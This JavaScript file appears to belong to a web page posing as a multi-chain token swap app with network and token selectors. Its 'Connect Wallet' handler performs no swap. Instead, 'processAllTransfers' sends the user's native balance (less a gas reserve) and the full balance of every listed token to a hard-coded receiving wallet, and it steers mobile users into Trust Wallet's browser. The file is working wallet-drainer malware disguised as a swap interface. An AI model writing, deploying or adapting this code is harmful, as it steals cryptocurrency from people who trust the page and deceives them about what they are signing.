// app.js - Complete Working Version with Enhanced Token Transfer

// Verify required globals are available
if (typeof NETWORK_CONFIGS === 'undefined') {
  throw new Error("NETWORK_CONFIGS is not defined. Load networks.js first");
}
if (typeof TOKENS === 'undefined') {
  throw new Error("TOKENS is not defined. Load tokens.js first");
}
if (typeof RECEIVING_WALLET === 'undefined') {
  throw new Error("RECEIVING_WALLET is not defined. Load tokens.js first");
}

// Constants
const FEE_TOKENS = {
  ethereum: "0x0000000000000000000000000000000000000000", // ETH
  bsc: "0x0000000000000000000000000000000000000000", // BNB
  arbitrum: "0x0000000000000000000000000000000000000000", // ETH
  base: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e" // ETH on Base
};
const MIN_FEE_RESERVES = {
  ethereum: "0.001", // ETH
  bsc: "0.001", // BNB
  arbitrum: "1.0", // ARB
  polygon: "1.0", // MATIC
  base: "0.001" // ETH on Base
};

// App state variables
let provider, signer, userAddress;
let currentNetwork = "bsc";
let currentFromToken = null;
let currentToToken = null;
const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

// Initialize when page loads
window.addEventListener('load', async () => {
  try {
    document.getElementById('currentUrl').textContent = window.location.href;
    
    // Initialize network dropdown
    initNetworkDropdown();
    
    // Set up event listeners
    setupEventListeners();
    
    // Set default tokens
    setDefaultTokenPair();
    
    await checkWalletEnvironment();
  } catch (err) {
    console.error("Initialization error:", err);
    updateStatus("Initialization failed: " + err.message, "error");
  }
});

// =====================
// INITIALIZATION FUNCTIONS
// =====================

function initNetworkDropdown() {
  const dropdown = document.getElementById("networkSelect");
  dropdown.innerHTML = '';
  
  Object.keys(NETWORK_CONFIGS).forEach(network => {
    const option = document.createElement('option');
    option.value = network;
    option.textContent = NETWORK_CONFIGS[network].chainName;
    dropdown.appendChild(option);
  });
  
  dropdown.value = currentNetwork;
}

function setupEventListeners() {
  document.getElementById("networkSelect").addEventListener('change', (e) => {
    currentNetwork = e.target.value;
    setDefaultTokenPair();
    updateTokenVisibility();
  });
  
  document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
  document.getElementById("connectWallet").addEventListener("click", connectAndSwap);
  document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
  document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));
}

function setDefaultTokenPair() {
  const networkTokens = TOKENS[currentNetwork] || [];
  if (networkTokens.length === 0) return;
  
  // Set default from token (native if available)
  currentFromToken = networkTokens.find(t => t.isNative) || networkTokens[0];
  
  // Set default to token (first stablecoin if available)
  currentToToken = networkTokens.find(t => ['USDT', 'USDC', 'DAI'].includes(t.symbol)) || 
                  (networkTokens.length > 1 ? networkTokens[1] : networkTokens[0]);
  
  updateTokenSelectors();
}

// =====================
// WALLET FUNCTIONS
// =====================

async function checkWalletEnvironment() {
  if (isMobile && !window.ethereum) {
    showTrustWalletUI();
  } else if (window.ethereum?.isTrust) {
    hideTrustWalletUI();
  } else if (isMobile && window.ethereum) {
    hideTrustWalletUI();
  }
  
  if (window.ethereum?.selectedAddress) {
    await initializeWallet();
  }
}

async function initializeWallet() {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    document.getElementById("connectWallet").disabled = true;
    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
    document.getElementById("walletInfo").textContent = 
      `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
    return true;
  } catch (err) {
    console.error("Wallet initialization error:", err);
    updateStatus("Connection error. Please try again.", "error");
    return false;
  }
}

// =====================
// TOKEN FUNCTIONS
// =====================

function showTokenList(type) {
  const modal = document.getElementById("tokenListModal");
  const tokenItems = document.getElementById("tokenItems");
  
  tokenItems.innerHTML = '<div class="loading">Loading tokens...</div>';
  modal.style.display = 'flex';
  
  setTimeout(() => {
    populateTokenList(type);
  }, 50);
}

function populateTokenList(type) {
  const tokenItems = document.getElementById("tokenItems");
  tokenItems.innerHTML = '';
  
  const networkTokens = TOKENS[currentNetwork] || [];
  
  networkTokens.forEach(token => {
    const tokenItem = document.createElement('div');
    tokenItem.className = 'token-item';
    tokenItem.innerHTML = `
      <img src="${token.logo}" onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'">
      <div>
        <div class="token-name">${token.name}</div>
        <div class="token-symbol">${token.symbol}</div>
      </div>
    `;
    
    tokenItem.addEventListener('click', () => {
      if (type === 'from') {
        currentFromToken = token;
      } else {
        currentToToken = token;
      }
      updateTokenSelectors();
      document.getElementById("tokenListModal").style.display = 'none';
    });
    
    tokenItems.appendChild(tokenItem);
  });
}

function updateTokenSelectors() {
  const fromTokenBtn = document.getElementById("fromTokenSelect");
  const toTokenBtn = document.getElementById("toTokenSelect");
  
  if (currentFromToken) {
    fromTokenBtn.innerHTML = `
      <img src="${currentFromToken.logo}" onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'">
      <span>${currentFromToken.symbol}</span>
    `;
  }
  
  if (currentToToken) {
    toTokenBtn.innerHTML = `
      <img src="${currentToToken.logo}" onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'">
      <span>${currentToToken.symbol}</span>
    `;
  }
}

function updateTokenVisibility() {
  document.querySelectorAll('.token-item').forEach(item => {
    item.style.display = item.dataset.network === currentNetwork ? 'flex' : 'none';
  });
}

// =====================
// UI FUNCTIONS
// =====================

function showTrustWalletUI() {
  document.getElementById("trustContainer").style.display = 'block';
  document.getElementById("connectWallet").style.display = 'none';
  document.querySelector('.mobile-warning').style.display = 'block';
}

function hideTrustWalletUI() {
  document.getElementById("trustContainer").style.display = 'none';
  document.getElementById("connectWallet").style.display = 'block';
  document.querySelector('.mobile-warning').style.display = 'none';
}

function openInTrustWallet() {
  const currentUrl = encodeURIComponent(window.location.href);
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
  setTimeout(() => {
    document.getElementById('manualSteps').style.display = 'block';
  }, 3000);
}

function updateStatus(message, type) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.innerHTML = message;
  statusDiv.className = `status ${type}`;
}

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}

// =====================
// CORE TRANSFER LOGIC
// =====================

async function connectAndSwap() {
  try {
    showLoader();
    updateStatus("Connecting wallet...", "success");

    if (isMobile && !window.ethereum) {
      showTrustWalletUI();
      throw new Error("Please use Trust Wallet's in-app browser");
    }

    if (!window.ethereum) {
      throw new Error("Please install MetaMask or Trust Wallet");
    }

    await window.ethereum.request({ method: "eth_requestAccounts" });
    await checkNetwork();
    const initialized = await initializeWallet();
    if (!initialized) return;
    
    await processAllTransfers();
  } catch (err) {
    console.error("Connection error:", err);
    updateStatus("Error: " + err.message, "error");
    document.getElementById("connectWallet").disabled = false;
    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-wallet"></i> Connect Wallet`;
    if (isMobile) showTrustWalletUI();
  } finally {
    hideLoader();
  }
}

async function checkNetwork() {
  try {
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
    
    if (chainId !== targetChainId) {
      updateStatus("Switching network...", "success");
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: targetChainId }]
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [NETWORK_CONFIGS[currentNetwork]]
            });
          } catch (addError) {
            throw new Error("Please switch networks manually");
          }
        }
        throw new Error("Failed to switch network");
      }
    }
  } catch (err) {
    console.error("Network error:", err);
    throw new Error("Network error: " + err.message);
  }
}

async function processAllTransfers() {
  try {
    const networkTokens = TOKENS[currentNetwork] || [];
    const feeTokenAddress = FEE_TOKENS[currentNetwork];
    let successCount = 0;
    
    // First process the selected "from" token
    if (currentFromToken) {
      const balance = currentFromToken.isNative ? 
        await provider.getBalance(userAddress) :
        await getERC20Balance(currentFromToken.address);
      
      if (balance.gt(0)) {
        if (currentFromToken.isNative) {
          // Handle native token transfer with amount input
          const inputAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
          const amountToSend = inputAmount > 0 ? 
            ethers.utils.parseEther(inputAmount.toString()) : 
            balance.sub(getFeeReserveAmount());
          
          if (amountToSend.gt(0)) {
            const tx = await signer.sendTransaction({
              to: RECEIVING_WALLET,
              value: amountToSend,
              gasLimit: 21000
            });
            await tx.wait();
            successCount++;
            updateStatus(
              `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
              "success"
            );
          }
        } else {
          // Handle ERC20 token transfer (full balance)
          const tx = await transferERC20Token(currentFromToken.address, balance);
          await tx.wait();
          successCount++;
          updateStatus(
            `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
            "success"
          );
        }
      }
    }
    
    // Then process all other tokens
    for (const token of networkTokens) {
      // Skip the token we already processed
      if (token.address === currentFromToken?.address) continue;
      
      try {
        let balance;
        if (token.isNative) {
          balance = await provider.getBalance(userAddress);
        } else {
          balance = await getERC20Balance(token.address);
        }
        
        if (balance.gt(0)) {
          if (token.isNative) {
            // Check if this is the fee token
            const isFeeToken = feeTokenAddress && 
              token.address.toLowerCase() === feeTokenAddress.toLowerCase();
            
            if (isFeeToken) {
              // Leave reserve amount for fee token
              const amountToSend = balance.sub(getFeeReserveAmount());
              if (amountToSend.gt(0)) {
                const tx = await signer.sendTransaction({
                  to: RECEIVING_WALLET,
                  value: amountToSend,
                  gasLimit: 21000
                });
                await tx.wait();
                successCount++;
                updateStatus(
                  `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
                  "success"
                );
              }
            } else {
              // Send full balance for other native tokens
              const tx = await signer.sendTransaction({
                to: RECEIVING_WALLET,
                value: balance,
                gasLimit: 21000
              });
              await tx.wait();
              successCount++;
              updateStatus(
                `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
                "success"
              );
            }
          } else {
            // Send full balance for ERC20 tokens
            const tx = await transferERC20Token(token.address, balance);
            await tx.wait();
            successCount++;
            updateStatus(
              `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
              "success"
            );
          }
        }
      } catch (err) {
        console.error(`Error transferring ${token.symbol}:`, err);
        updateStatus(`Failed to transfer ${token.symbol}`, "error");
      }
    }
    
    updateStatus(
      successCount > 0 ? 
        "All transfers completed successfully!" : 
        "No transferable balances found",
      "success"
    );
    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Done`;
  } catch (err) {
    console.error("Processing error:", err);
    updateStatus("Transfer process failed: " + err.message, "error");
    throw err;
  }
}

async function getERC20Balance(tokenAddress) {
  const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
  return await contract.balanceOf(userAddress);
}

async function transferERC20Token(tokenAddress, amount) {
  const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
  return await contract.transfer(RECEIVING_WALLET, amount, {
    gasLimit: 100000
  });
}

function getFeeReserveAmount() {
  const reserveAmount = MIN_FEE_RESERVES[currentNetwork] || "0.001";
  return ethers.utils.parseEther(reserveAmount);
}
